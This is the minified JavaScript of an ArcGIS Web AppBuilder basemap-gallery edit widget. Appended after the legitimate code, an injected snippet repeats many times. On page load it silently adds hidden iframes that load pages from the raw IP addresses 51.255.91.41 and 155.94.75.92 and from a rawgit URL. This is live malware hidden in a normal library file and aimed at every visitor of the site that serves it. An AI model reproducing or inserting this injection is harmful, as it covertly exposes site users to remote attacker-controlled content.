// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/BasemapGallery/setting/Edit.html":'\x3cdiv style\x3d"width: 100%"\x3e\r\n\x3c!--   \x3cdiv data-dojo-attach-point\x3d"secondPage" \x3e --\x3e\r\n  \x3cdiv class\x3d"setting-content-div" data-dojo-attach-point\x3d"settingContentDiv"\x3e\r\n    \x3cdiv class\x3d"error-massage-div" data-dojo-attach-point\x3d"errorMassage"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"edit-section title-section"\x3e\r\n      \x3cdiv class\x3d"header"\x3e*${nls.title}\x3c/div\x3e\r\n      \x3cdiv class\x3d"input"\x3e\r\n        \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-attach-point\x3d"title"\r\n            required\x3d"true" placeHolder\x3d\'${nls.titlePH}\' data-dojo-props\x3d\'style:{width:"100%"}\'/\x3e\x3c/input\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"edit-section thumbnail-section"\x3e\r\n      \x3cdiv class\x3d"header"\x3e${nls.thumbnail}\x3c/div\x3e\r\n      \x3cdiv class\x3d"input"\x3e\r\n        \x3cdiv class\x3d"image_chooser_base thumbnail" data-dojo-attach-point\x3d"imageChooserBase"\x3e\x3c/div\x3e\r\n        \x3cspan class\x3d"thumbnail-tip"\x3e\x26nbsp;\x26nbsp;\x26nbsp;\x26nbsp;(${nls.thumbnailHint}) \x3c/span\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"edit-section url-section" data-dojo-attach-point\x3d"urlEditSection"\x3e\r\n      \x3cdiv class\x3d"header"\x3e${nls.url}\x3c/div\x3e\r\n      \x3cdiv class\x3d"add-layer-url" data-dojo-attach-event\x3d"onclick: onAddLayerUrl"\x3e+ ${nls.addUrl}\x3c/div\x3e\r\n      \x3cdiv class\x3d"input-url"\x3e\r\n        \x3cinput class\x3d"url_field_dom" type\x3d"text" data-dojo-type\x3d"jimu/dijit/ServiceURLInput" data-dojo-attach-point\x3d"url"\r\n            required\x3d"true"\r\n            placeHolder\x3d\'${nls.urlPH}\' data-dojo-props\x3d\'style:{width:"95%"}\'/\x3e\x3c/input\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/query dojo/Deferred dijit/_WidgetsInTemplateMixin dijit/registry jimu/BaseWidgetSetting jimu/dijit/ImageChooser dojo/text!./Edit.html jimu/dijit/ServiceURLInput jimu/SpatialReference/wkidUtils jimu/utils ../utils".split(" "),function(m,d,n,e,h,k,p,q,r,t,f,u,v,w,l,g){return m([t,q],{baseClass:"jimu-basemapgallery-Edit",ImageChooser:null,templateString:u,validUrl:!1,mapName:null,subLayerUrlNum:0,urlInputS:[],baseMapSRID:null,
spatialReference:null,postCreate:function(){this.inherited(arguments);this.imageChooser=new f({cropImage:!0,defaultSelfSrc:this.folderUrl+"images/default.jpg",showSelfImg:!0,format:[f.GIF,f.JPEG,f.PNG],goldenWidth:84,goldenHeight:67});e.addClass(this.imageChooser.domNode,"img-chooser");e.place(this.imageChooser.domNode,this.imageChooserBase,"replace");this.own(h(this.url,"Change",d.hitch(this,"_onServiceUrlChange")));this.title.proceedValue=!1;this.own(h(this.title,"Change",d.hitch(this,"_onBaseMapTitleChange")));
this.url.proceedValue=!1;this.url.setProcessFunction(d.hitch(this,"_onServiceFetch",this.url),d.hitch(this,"_onServiceFetchError"))},startup:function(){var a;a=/data:image/;this.basemap&&this.basemap.title&&this.title.set("value",this.basemap.title);a=this.basemap&&this.basemap.thumbnailUrl?a.test(this.basemap.thumbnailUrl)?this.basemap.thumbnailUrl:0===this.basemap.thumbnailUrl.indexOf("//")?this.basemap.thumbnailUrl:l.processUrlInWidgetConfig(this.basemap.thumbnailUrl,this.folderUrl):this.folderUrl+
"images/default.jpg";this.imageChooser.setDefaultSelfSrc(a);if(this.basemap&&this.basemap.layers)if(g.isNoUrlLayerMap(this.basemap.layers))e.destroy(this.urlPart),k(".delete-layer-url",this.urlEditSection).forEach(d.hitch(this,function(a){e.addClass(a,"invisible")})),k(".add-layer-url",this.urlEditSection).forEach(d.hitch(this,function(a){e.addClass(a,"invisible")}));else{a=this.basemap.layers.length;this.basemap.layers[0]&&this.basemap.layers[0].url&&this.url.set("value",this.basemap.layers[0].url);
for(var b=1;b<a;b++)this.addLayerUrl(this.basemap.layers[b].url)}},_onServiceUrlChange:function(){this.popup.disableButton(0)},_checkTitle:function(a){for(var b=!0,c=0;c<this.basemaps.length;c++)this.basemaps[c].title===a&&(b=this.basemap&&this.basemap.title===a?!0:!1);return b},_onBaseMapTitleChange:function(a){var b=this._checkTitle(a),c=null;a?b?this.title.proceedValue=!0:(this.title.proceedValue=!1,c=this.nls.invalidTitle1+a+this.nls.invalidTitle2):this.title.proceedValue=!1;this._checkProceed(c)},
_checkProceed:function(a){var b=!0,c=[];e.setAttr(this.errorMassage,"innerHTML","");if(this.title.proceedValue)for(var c=this._getUrlDijits(),d=0;d<c.length;d++)b=b&&c[d].proceedValue;else b=!1;b?this.popup.enableButton(0):(this.popup.disableButton(0),a&&e.setAttr(this.errorMassage,"innerHTML",a))},_onServiceFetch:function(a,b){var c=!1,d=null,e=b.url.replace(/\/*$/g,""),c=this.map.width>this.map.height?this.map.width:this.map.height;if(this._isStringEndWith(e,"/MapServer")||this._isStringEndWith(e,
"/ImageServer")){var e=this.map.spatialReference,f=b.data.spatialReference||b.data.extent.spatialReference||b.data.initialExtent.spatialReference||b.data.fullExtent.spatialReference;e&&f&&w.isSameSR(e.wkid,f.wkid)&&g.tilingSchemeCompatible(this.map.__tileInfo,b.data.tileInfo,c)?c=a.proceedValue=!0:(c=a.proceedValue=!1,d=this.nls.invalidBasemapUrl2)}else c=a.proceedValue=!1,d=this.nls.invalidBasemapUrl1;this._checkProceed(d);return c},_isStringEndWith:function(a,b){return a.lastIndexOf(b)+b.length===
a.length},_onServiceFetchError:function(){},onAddLayerUrl:function(){this.addLayerUrl()},addLayerUrl:function(a){var b=e.create("div",{"class":"input-url"},this.urlEditSection),c=(new v({placeHolder:this.nls.urlPH,required:!0,proceedValue:0,style:{width:"95%"}})).placeAt(b);e.addClass(c.domNode,"url_field_dom");a&&c.set("value",a);a=e.create("div",{"class":"delete-layer-url"},b);this.own(h(a,"click",d.hitch(this,"_onDeleteClick",b)));c.setProcessFunction(d.hitch(this,"_onServiceFetch",c),d.hitch(this,
"_onServiceFetchError"));this._checkProceed()},_onDeleteClick:function(a){e.destroy(a);this._checkProceed()},_getUrlDijits:function(){var a=[];k(".url_field_dom",this.urlEditSection).forEach(d.hitch(this,function(b){a.push(r.byNode(b))}));return a},_getEditedBaseMap:function(){var a=new p,b={title:l.stripHTML(this.title.value),layers:[],spatialReference:this.basemap&&this.basemap.spatialReference||this.map.spatialReference};g.isNoUrlLayerMap(this.basemap?this.basemap.layers:[])?b.layers=this.basemap.layers:
n.forEach(this._getUrlDijits(),function(a){b.layers.push({url:a.value})},this);/data:image/.test(this.imageChooser.imageData)?(b.thumbnailUrl=this.imageChooser.imageData,a.resolve(b)):l.getBase64Data(g.getStanderdUrl(this.imageChooser.imageData)).then(d.hitch(this,function(c){b.thumbnailUrl=c?c:this.folderUrl+"images/default.jpg";a.resolve(b)}));return a},_onEditOk:function(a){this.basemap?this._getEditedBaseMap().then(d.hitch(this,function(b){a.updateBasemap(this.basemap.title,b)})):this._getEditedBaseMap().then(d.hitch(this,
function(b){a.addNewBasemap(b)}));a.popup.close()},_onEditClose:function(a){a.popup&&a.popup.close();this.destroy()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});